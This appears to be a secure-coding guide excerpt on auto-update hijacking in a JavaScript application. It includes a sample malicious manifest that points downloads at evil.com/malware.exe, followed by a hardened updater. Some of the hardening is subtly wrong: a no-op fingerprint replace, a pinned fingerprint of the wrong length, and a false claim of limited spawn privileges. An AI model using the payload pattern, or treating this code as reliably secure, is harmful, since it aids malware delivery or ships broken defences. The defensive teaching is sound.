**Attack Scenario**:
```text
1. Attacker performs DNS hijacking or compromises CDN
2. Malicious version.json points to attacker's server:
   {"needsUpdate": true, "downloadUrl": "https://evil.com/malware.exe"}
3. Application downloads and executes malware with user privileges
4. Alternatively: Attacker compromises update server directly (supply chain)
```

**Why This Is Dangerous**:
- No cryptographic signature verification of downloaded files
- No certificate pinning - vulnerable to MITM attacks
- No checksum/hash verification of downloaded content
- Blindly executes downloaded code with full application privileges
- No rollback mechanism if update is corrupted/malicious

**SECURE VERSION**:

```javascript
const https = require('https');
const fs = require('fs');
const crypto = require('crypto');
const path = require('path');
const { spawn } = require('child_process');

class SecureAutoUpdater {
  constructor(config) {
    this.updateUrl = config.updateUrl;
    this.downloadPath = path.join(__dirname, 'update.exe');
    // Embed the public key for signature verification
    this.publicKey = config.publicKey;
    this.allowedHosts = config.allowedHosts;
  }

  verifySignature(data, signature) {
    const verify = crypto.createVerify('RSA-SHA256');
    verify.update(data);
    verify.end();
    return verify.verify(this.publicKey, signature, 'base64');
  }

  verifyChecksum(filePath, expectedHash) {
    return new Promise((resolve, reject) => {
      const hash = crypto.createHash('sha256');
      const stream = fs.createReadStream(filePath);
      stream.on('data', chunk => hash.update(chunk));
      stream.on('end', () => {
        const calculatedHash = hash.digest('hex');
        resolve(calculatedHash === expectedHash);
      });
      stream.on('error', reject);
    });
  }

  isAllowedHost(url) {
    try {
      const parsedUrl = new URL(url);
      return this.allowedHosts.includes(parsedUrl.hostname);
    } catch {
      return false;
    }
  }

  async checkForUpdates() {
    return new Promise((resolve, reject) => {
      const options = {
        hostname: new URL(this.updateUrl).hostname,
        path: '/version.json',
        method: 'GET',
        // Certificate pinning
        checkServerIdentity: (host, cert) => {
          const validFingerprints = [
            'AB:CD:EF:12:34:56:78:90:AB:CD:EF:12:34:56:78:90:AB:CD:EF:12'
          ];
          const fingerprint = cert.fingerprint256.replace(/:/g, ':');
          if (!validFingerprints.includes(fingerprint)) {
            return new Error('Certificate fingerprint mismatch');
          }
        }
      };

      https.get(options, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
          try {
            const versionData = JSON.parse(data);
            // Verify the version manifest signature
            if (!this.verifySignature(
              JSON.stringify(versionData.manifest),
              versionData.signature
            )) {
              reject(new Error('Invalid version manifest signature'));
              return;
            }
            resolve(versionData.manifest);
          } catch (e) {
            reject(new Error('Invalid version data'));
          }
        });
      }).on('error', reject);
    });
  }

  async downloadUpdate(manifest) {
    // Verify download URL is from allowed host
    if (!this.isAllowedHost(manifest.downloadUrl)) {
      throw new Error('Download URL not from allowed host');
    }

    return new Promise((resolve, reject) => {
      const file = fs.createWriteStream(this.downloadPath);
      https.get(manifest.downloadUrl, (res) => {
        res.pipe(file);
        file.on('finish', async () => {
          file.close();
          // Verify downloaded file checksum
          const checksumValid = await this.verifyChecksum(
            this.downloadPath,
            manifest.sha256
          );
          if (!checksumValid) {
            fs.unlinkSync(this.downloadPath);
            reject(new Error('Downloaded file checksum mismatch'));
            return;
          }
          resolve(this.downloadPath);
        });
      }).on('error', reject);
    });
  }

  async installUpdate() {
    // Spawn with limited privileges, don't inherit shell
    return new Promise((resolve, reject) => {
      const child = spawn(this.downloadPath, [], {
        detached: true,
        stdio: 'ignore'
      });
      child.unref();
      resolve();
    });
  }
}
```

**Key Security Controls**:
- **Cryptographic signature verification**: Updates must be signed with a private key; public key embedded in app
- **SHA-256 checksum verification**: Downloaded files are hashed and compared against signed manifest
- **Certificate pinning**: Prevents MITM attacks even with compromised CAs
- **Host allowlisting**: Only downloads from pre-approved domains

